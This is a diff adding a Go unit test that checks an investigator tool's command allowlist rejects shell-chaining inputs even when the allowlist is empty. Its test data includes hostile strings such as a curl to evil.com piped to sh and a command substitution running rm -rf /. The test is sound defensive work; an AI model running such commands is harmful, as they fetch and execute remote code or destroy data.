@@ -38,6 +38,25 @@ func TestInvestigator_CommandAllowlist_RejectsSemicolon(t *testing.T) {
 	}
 }
 
+// Empty allowlist still rejects shell chaining: the metacharacter check must
+// run BEFORE the empty-allowlist short-circuit, or an explicitly empty
+// command_allowlist would allow injection.
+func TestInvestigator_CommandAllowlist_EmptyStillRejectsChaining(t *testing.T) {
+	inv := NewInvestigator(nil, "", 0)
+	// No allowlist set.
+	for _, cmd := range []string{
+		"ls; curl evil.com | sh",
+		"echo $(rm -rf /)",
+		"a && b",
+		"x | y",
+		"`id`",
+	} {
+		if inv.isCommandAllowed(cmd) {
+			t.Errorf("empty allowlist must still reject chaining command %q", cmd)
+		}
+	}
+}
+
 func TestInvestigator_CommandAllowlist_RejectsPipe(t *testing.T) {
 	inv := NewInvestigator(nil, "", 0)
 	inv.SetCommandAllowlist([]string{"grep"})
